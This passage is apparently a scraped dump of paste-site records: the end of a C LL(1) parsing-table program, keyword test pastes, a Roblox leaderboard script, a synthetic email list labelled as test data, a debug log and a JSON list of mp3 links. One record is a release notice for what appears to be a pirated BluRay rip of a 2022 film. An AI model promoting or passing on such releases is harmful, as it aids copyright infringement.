printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %s: "", pro[i].str);\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 }\n\xa0 \xa0 terminal[\'$\'] = 1;\n\xa0 \xa0 terminal[\'^\'] = 0;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 printf(""\\n\\t**************** LL(1) PARSING TABLE *******************\\n"");\n\xa0 \xa0 printf(""\\t--------------------------------------------------------\\n"");\n\xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (terminal[i]) printf(""%-10c"", i);\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 int p = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != 0 && (pro[i].str[0] != pro[i - 1].str[0]))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 p = p + 1;\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j] && j != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][j] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (first_rhs[i][\'^\']) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (k = 0; k < TSIZE; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[pro[i].str[0] - \'A\'][k]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][k] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 k = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10c"", pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (table[k][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", pro[table[k][j] - 1].str);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (terminal[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++k;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return 0;\n}', date='2022-06-01 08:34:17 +00:00', hash_val='fd44fd9f60762b088c18d5c71821c406', url='/qdR5zyy2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 7', content='marvel super hero supercalifragilisticexpialidocious cape cloak villain', date='2022-06-01 08:25:17 +00:00', hash_val='79bef4879974aeaf07c8cbf1d9e35a8e', url='/rcX9dTCJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 5', content='yacht supercalifragilisticexpialidocious bosun deckhand stewardess', date='2022-06-01 08:23:15 +00:00', hash_val='9e9bb4e4aeadd80b4327c590edfbbf55', url='/2iPjcm3r', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 3', content='dave supercalifragilisticexpialidocious test', date='2022-06-01 08:20:16 +00:00', hash_val='37094481a6b74ce4d004113a2a875152', url='/srQ8CL61', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content='[pre][b][font=Lucida Console][u]The.Contractor.2022.720p.BluRay.DD+5.1.x264-playHD[/u][/font][/b]\n\xa0\n[b][u]RELEASE iNFO:[/b][/u]\nRELEASE SIZE........: 6.24 GiB\nRUNTIME.............: 1 h 43 min\nVIDEO CODEC.........: x264, L4.1 @ CRF\nBITRATE.............: 7 621 kb/s\nRESOLUTION..........: 1280x536 pixels\nFRAMERATE...........: 23.976 (24000/1001) FPS\nAUDIO...............: English DD+5.1 at 1 024 kb/s \xa0\nSUBTITLES...........: English Forced \nSUBTITLES...........: English \xa0\nSUBTITLES...........: English SDH \nSUBTITLES...........: [b][color=#4bb702]Romanian[/b][/color] \xa0 \nCHAPTERS............: Yes\nSOURCE NAME.........: Remux\nIMDb LINK...........: https://www.imdb.com/title/tt10323676/\nENCODER.............: [b][color=#4bb702]JigSaw @[/b][/color] [b][color=#FFD700]playHD[/b][/color]\nNOTES...............: Manual overlay to fix top & bottom dirty lines.\n\xa0\n[quote]x264 [info]: frame I:1101 \xa0Avg QP:12.78 \xa0size:118418\nx264 [info]: frame P:30020 Avg QP:13.93 \xa0size: 64802\nx264 [info]: frame B:117584 Avg QP:14.94 \xa0size: 32595\nx264 [info]: consecutive B-frames: \xa01.5% \xa01.8% \xa09.8% 15.6% 13.9% 34.3% \xa08.8% \xa04.8% \xa04.7% \xa04.7%[/quote][/pre]\n\xa0\n[center]\n[b][font=Lucida Console]Source | playHD[/b][/font]\n\xa0\n[URL=https://imgbox.com/WQLmt2zG][IMG]https://thumbs2.imgbox.com/57/a5/WQLmt2zG_t.png[/IMG][/URL] [URL=https://imgbox.com/rs6wNfgv][IMG]https://thumbs2.imgbox.com/78/97/rs6wNfgv_t.png[/IMG][/URL] [URL=https://imgbox.com/WJRdB76f][IMG]https://thumbs2.imgbox.com/5d/51/WJRdB76f_t.png[/IMG][/URL] [URL=https://imgbox.com/tA5fvHRS][IMG]https://thumbs2.imgbox.com/a9/b6/tA5fvHRS_t.png[/IMG][/URL] [URL=https://imgbox.com/1UjP8PAj][IMG]https://thumbs2.imgbox.com/12/1a/1UjP8PAj_t.png[/IMG][/URL] [URL=https://imgbox.com/mk8CdM25][IMG]https://thumbs2.imgbox.com/d7/9b/mk8CdM25_t.png[/IMG][/URL] [URL=https://imgbox.com/iufgW7Au][IMG]https://thumbs2.imgbox.com/67/a6/iufgW7Au_t.png[/IMG][/URL] [URL=https://imgbox.com/rI6Gse26][IMG]https://thumbs2.imgbox.com/49/a3/rI6Gse26_t.png[/IMG][/URL] [URL=https://imgbox.com/d5ZEWKRe][IMG]https://thumbs2.imgbox.com/21/f6/d5ZEWKRe_t.png[/IMG][/URL] [URL=https://imgbox.com/n2lRQPxE][IMG]https://thumbs2.imgbox.com/e9/41/n2lRQPxE_t.png[/IMG][/URL] [URL=https://imgbox.com/YhOzGS5D][IMG]https://thumbs2.imgbox.com/0a/99/YhOzGS5D_t.png[/IMG][/URL] [URL=https://imgbox.com/IS3pxSog][IMG]https://thumbs2.imgbox.com/de/6e/IS3pxSog_t.png[/IMG][/URL]\n\xa0\n[img=https://i.postimg.cc/MpRJJt3Z/play-HD.png][/center]', date='2022-06-01 08:11:00 +00:00', hash_val='96308e1acf43aa8e7c3456982ef10ddb', url='/r0EmaSbG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dubleeyrblxx', title='Kills and Deaths -- Roblox', content='game.Players.PlayerAdded:Connect(function(player)\n\xa0\n\xa0 \xa0 local spectator = game:GetService(\'Teams\'):FindFirstChild(""Spectator"")\n\xa0\n\xa0 \xa0 local leaderstats = Instance.new(""Folder"", player)\n\xa0 \xa0 leaderstats.Name = ""leaderstats""\n\xa0 \xa0 \n\xa0 \xa0 local kills = Instance.new(""NumberValue"",leaderstats)\n\xa0 \xa0 kills.Name = ""Kills""\n\xa0 \xa0 kills.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 local deaths = Instance.new(""NumberValue"", leaderstats)\n\xa0 \xa0 deaths.Name = ""Deaths""\n\xa0 \xa0 deaths.Value = 0\n\xa0 \xa0 \n\xa0 \xa0 player.CharacterAdded:Connect(function(character)\n\xa0 \xa0 \xa0 \xa0 local humanoid = character:FindFirstChild(""Humanoid"")\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 humanoid.Died:Connect(function(died)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 deaths.Value = deaths.Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local tag = humanoid:FindFirstChild(""creator"")\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 local killer = tag.Value\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if tag and killer then\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 killer.leaderstats:FindFirstChild(""Kills"").Value = killer.leaderstats:FindFirstChild(""Kills"").Value + 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 end\n\xa0 \xa0 \xa0 \xa0 end)\n\xa0 \xa0 end)\nend)', date='2022-06-01 07:46:51 +00:00', hash_val='766dac8922e30bb00a805f57dde31586', url='/CYkqZSc5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='emails', content="Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY\n\xa0\nDATA_ID_TESTDATATOFIND NOEXCLUDES\n\xa0\nCooper.Kleine@findmetesting.co.uk \nMariquilla.Evenden@findmetesting.co.uk \nNoll.Ingolotti@findmetesting.co.uk \xa0\nGrove.Feldbaum@findmetesting.co.uk \nMack.Osment@findmetesting.co.uk \nTrisha.Zanicchelli@findmetesting.co.uk\nJack.Gorriessen@findmetesting.co.uk \nNefen.Malec@findme-testing.co.uk \nBirdie-Gemmill@findmetesting.co.uk\nRosabella.Nias@findmetesting.co.uk\nEllerey.Fanti@findmetesting.cn\nAntonina.Carsey@findmetesting.cn\nValry.Shead@findmetesting.cn \nConrade.Ferrarone@findmetesting.cn\nNeysa.Fazakerley@findmetesting.cn\nCristobal.Primak@findmetesting.cn\nWakefield.Kent@findmetesting.cn\nfindme.Cheales@findmetesting.cn\nNert.Roddamr@findmetesting.cn \nRichy.Raft@findmetesting.cn\nBerget.Kermannes@findmetesting.ie \nShelden.Tregea@findmetesting.ie \nAllsun.Badrick@findmetesting.ie \nHortense.Ivkovic@findmetesting.ie\nCarolin.Potte@findmetesting.ie\nBenjie.Trumble@findmetesting.ie\nAndrew.Hadgkiss@findmetesting.ie\nTrula.Kuna@findmetesting.ie\nTommie.Maytum@findmetesting.ie\nLangsdon.Pakes@findmetesting.ie\nPorty.Tooth@findmetesting.au\nRozella.Siggefindmetesting.au\nNolie.Tumultyfindmetesting.au\nDud.Caustonfindmetesting.au\nAlvinia.Brameldfindmetesting.au\nMeridel.Lymbournefindmetesting.au\nElvis.Maleckfindmetesting.au\nBrett.Oughtonfindmetesting.au\nRickard.Clemfindmetesting.au\nPrue.Firemanfindmetesting.au\nUriel.Rozenbaum@findmetesting25.com\nCindie.Greeson@findmetesting25.com\nLaurette.Puckham@findmetesting25.com\nEldredge.Ricket@findmetesting25.com\nAlanah.Rapper@findmetesting25.com\nAsh.Le.Prevost@findmetesting25.com\nGalvin.Purchon@findmetesting25.com\nLauryn.Ilson@findmetesting25.com\nfindme.Graffin@findmetesting25.com\nEdithe.Trehearne@findmetesting25.com\nDen.Cancutt@findmetesting10.com\nWernher.Spatoni@findmetesting10.com\nMalchy.Ion@findmetesting10.com\nLeona.Whitby@findmetesting10.com\nAlphonse.Goodlake@findmetesting10.com\nGran.Standen@findmetesting10.com\nBarnie.Gilffilland@findmetesting10.com\nKaylyn.Ditchfield@findmetesting10.com\nDorotea.Kohlerman@findmetesting10.com\nGillan.Lampel@findmetesting10.com\nPatrica.Mannakee@findustesting.com\nPippo.Sewart@findustesting.com\nLanae.Cousin@findustesting.com\nPorter.Glaysher@findustesting.com\nHerschel.Yaakov@findustesting.com\nfindme.Parsand@findustesting.com\nLucho.Cosh@findustesting.com\nCullie.Powlesland@findustesting.com\nEdy.Burkart@findustesting.com\nChristophorus.Ackeroyd@findustesting.com\nArvy.Rowson@findUStesting.com\nArlan.Ivanilov@findustesting.com\nTawnya.Waslin@findustesting.com\nInigo.Gyrgorcewicx@findustesting.com\nSharity.Stoodley@findustesting.com\nGinger.Dresse@findustesting.com\nDeck.Jouannot@findustesting.com\nDeny.Soanes@findustesting.com\njames@findmetesting.com\n\xa0\nWenona.Moverley@findqatesting.com\nJerry.Poynter@findqatesting.com\nDrugi.Neeson@findqatesting.com\nWinny.Binfield@findqatesting.com\nDarill.Greenshiels@findqatesting.com\nEthelin.Pinchen@findqatesting.com\nTanney.Ballendine@findqatesting.com\nAriadne.Wincott@findqatesting.com\nWinnie.Domm@findqatesting.com\nRogerio.Cudbird@findqatesting.com\nYu@findmetesting.com\n\xa0\nRIGHT OF @\nfindme@findme.testing.com\nwildcard@findme*testing.com\ndash@findme-testing.com\nslash@findme/testing.com\nquestionmark@findme?testing.com\n\xa0\nACCENTS\nPål@findmetesting.com\nMagdalène@findmetesting.com\nAnaël@findmetesting.com\nLén@findmetesting.com\nLoïs@findmetesting.com\nThérèsa@findmetesting.com\nValérie@findmetesting.com\nGörel@findmetesting.com\nMélia@findmetesting.com\nJoséphine@findmetesting.com\nLoïc@findmetesting.com\nfindme@findmetesting.com\nMéghane@findmetesting.com\nNuó@findmetesting.com\nLén@findmetesting.com\nEliès@findmetesting.com\nAndré@findmetesting.com\nMahélie@findmetesting.com\nMéthode@findmetesting.com\nRachèle@findmetesting.com\nMélina@findmetesting.com\nGaëlle@findmetesting.com\nCéline@findmetesting.com\nBérangère@findmetesting.com\nFrançoise@findmetesting.com\nSéverine@findmetesting.com\nMåns@findmetesting.com\nAdèle@findmetesting.com\nAimée@findmetesting.com\nMélia@findmetesting.com\nGösta@findmetesting.com\nLaurène@findmetesting.com\nGisèle@findmetesting.com\nMélinda@findmetesting.com\nBécassine@findmetesting.com\nRuì@findmetesting.com\nZoé@findmetesting.com\nMaëline@findmetesting.com\nAimée@findmetesting.com\nAndréanne@findmetesting.com\nAdélaïde@findmetesting.com\nLaurène@findmetesting.com\nAnaé@findmetesting.com\nNoëlla@findmetesting.com\nAnaël@findmetesting.com\nMaëlyss@findmetesting.com\nLucrèce@findmetesting.com\nLén@findmetesting.com\nMarie-thérèse@findmetesting.com\nMaéna@findmetesting.com\nHélène@findmetesting.com\nHélèna@findmetesting.com\nMéng@findmetesting.com\nCrééz@findmetesting.com\nMélanie@findmetesting.com\nFrédérique@findmetesting.com\nMédiamass@findmetesting.com\nAndré@findmetesting.com\nCinéma@findmetesting.com\nMégane@findmetesting.com\nAmélie@findmetesting.com\nNadège@findmetesting.com\nRébecca@findmetesting.com\nMédiamass@findmetesting.com\nCéline@findmetesting.com\nMaïly@findmetesting.com\nMaï@findmetesting.com\nMaëlann@findmetesting.com\nNoëlla@findmetesting.com\nLaurélie@findmetesting.com\nRuì@findmetesting.com\nChloé@findmetesting.com\nGaëlle@findmetesting.com\nVénus@findmetesting.com\nFrédérique@findmetesting.com\nAmélie@findmetesting.com\nLoïs@findmetesting.com\nMarlène@findmetesting.com\nStévina@findmetesting.com\nClémentine@findmetesting.com\nMégane@findmetesting.com\nMéng@findmetesting.com\nAndré@findmetesting.com\nCrééz@findmetesting.com\nAí@findmetesting.com\nUò@findmetesting.com\nYú@findmetesting.com\nMarie-françoise@findmetesting.com\nUò@findmetesting.com\nInès@findmetesting.com\nOcéane@findmetesting.com\nMarie-ève@findmetesting.com\nRébecca@findmetesting.com\nZoé@findmetesting.com\nLài@findmetesting.com\nRachèle@findmetesting.com\nCécile@findmetesting.com\nMaïlys@findmetesting.com\nGarçon@findmetesting.com\nhereiam@testing.com\n\xa0\nIt's a game of per%entage percentage.\nFindme#testing Findme testing.\nOver&over&over Over over over.\n[findmeinbrackets], findmeinbrackets\n(findmeinbrackets), findmeinbrackets\n<findmeinbrackets>, findmeinbrackets\n{findmeinbrackets>}, findmeinbrackets\nhttp://findme-testing.here.com\nhttp:\\\\findme-testing.here.com\n\xa0\nVestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. \nLorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.\n\xa0\nVivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.\n\xa0\nFuzzy-Wuzzy - DASH\nFuzzy;Wuzzy - COLON\nFuzzy!Wuzzy - EXCLAMATION\nFuzzy£Wuzzy\xa0 \xa0 - POUND\nFuzzy#Wuzzy - HASH\nFuzzy%Wuzzy - PERCENT\nFuzzy@Wuzzy - AT\nFuzzy&Wuzzy - AND\nFuzzy=Wuzzy - EQUAL\nFuzzy§Wuzzy\nFuzzy~Wuzzy\nFuzzy?Wuzzy \xa0- QUESTION MARK\nFuzzy$Wuzzy \xa0- DOLLAR\nFuzzy[Wuzzy] - BRACKETS\nFuzzy^Wuzzy\nFuzzy(Wuzzy) - BRACKETS\nFuzzy+Wuzzy \xa0- PLUS\nFuzzy±Wuzzy\xa0 \xa0 \xa0- PLUS/MINUE\nFuzzy|Wuzzy \xa0- PIPE\nFuzzy/Wuzzy \xa0- FORWARDSLASH\nFuzzy<Wuzzy> - BRACKETS\nFuzzy{Wuzzy} - CURLY\nFuzzy\\Wuzzy \xa0- BACKSLASH", date='2022-06-01 07:45:53 +00:00', hash_val='d521891abb2ecbda38f824b8a3d8104a', url='/qAebbKk4', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='RidwanRF', title='debug', content="Place container on the ground\nground: 4.2747402191162, oz: 1.4519195556641 z: 5.2747402191162 z-oZ: 3.8228206634521\nPlace container on the ground\nground: 3.5087738037109, oz: 1.4519195556641 z: 4.5087738037109 z-oZ: 3.0568542480469\nPlace container on the ground\nground: 3.4450035095215, oz: 1.4519195556641 z: 4.4450035095215 z-oZ: 2.9930839538574\nPlace container on the ground\nground: 2.9643530845642, oz: 1.4519195556641 z: 3.9643530845642 z-oZ: 2.5124335289001\nPlace container on the ground\nground: 2.964608669281, oz: 1.4519195556641 z: 3.964608669281 z-oZ: 2.5126891136169\nPlace container on the ground\nground: 2.9645137786865, oz: 1.4519195556641 z: 3.9645137786865 z-oZ: 2.5125942230225\nPress 'space' to detach/release magnet!\nground: 2.5546875, oZ: 1.4519195556641 z: 5.0872707366943 z-oZ: 3.6353511810303\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 4.3248100280762 z-oZ: 2.8728904724121\nPlace container on the ground\nground: 2.5546875, oZ: 1.4519195556641 z: 3.964515209198 z-oZ: 2.5125956535339\nCorrect placement of container!", date='2022-06-01 07:16:33 +00:00', hash_val='7f8b3015e7a25053e4628abcae0c6d7d', url='/A2nuM6yG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='spidersam', title='05-2022', content='[\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-02-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/32dc10bd-858e-b80c-9f15-278d0b68c2b9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-03-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/ea4efc17-9f17-0e26-64b9-c030c1775a05.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-04-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/49edac30-6207-bc7c-a974-f713082304ce.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-05-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/11318565-16f8-04d3-bcf2-45816fd7223b.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-06-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/00bc3408-f311-cbb3-2cc2-e1b8120c02a9.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-07-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/9f9378bc-b09f-8367-57be-7cf435fac6a1.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-09-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3e10b8b4-49e2-5e57-47ed-db2eaf4e0e14.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-10-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/e6d4de20-5e87-975a-b5c7-4422136b4211.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-11-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/cecd8271-d5eb-5b63-35e9-4fc1ae5e4dd7.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-12-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/1a1c0347-7663-771b-dc12-d5fe7754e845.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-13-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/0464c959-0458-1342-68bf-40a997d1cff5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-14-05-2022-Compilation-The Jackal"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/b2972776-d4e3-c346-17c2-d72be66d549e.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-16-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/10047a3b-1047-5a98-066c-e117c3f5790d.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-17-05-2022-S@m"",\n\xa0 \xa0 ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2022-5-1/3af361b7-fd42-2f28-6e5e-a15e794e4ee5.mp3"",\n\xa0 \xa0 ""imageUrl"": ""https://i.imgur.com/gHnrnOgm.jpg""\n\xa0 },\n\xa0 {\n\xa0 \xa0 ""name"": ""Zoo-18-05-2022-S@m"",\n\xa0 \xa0 ""url"": 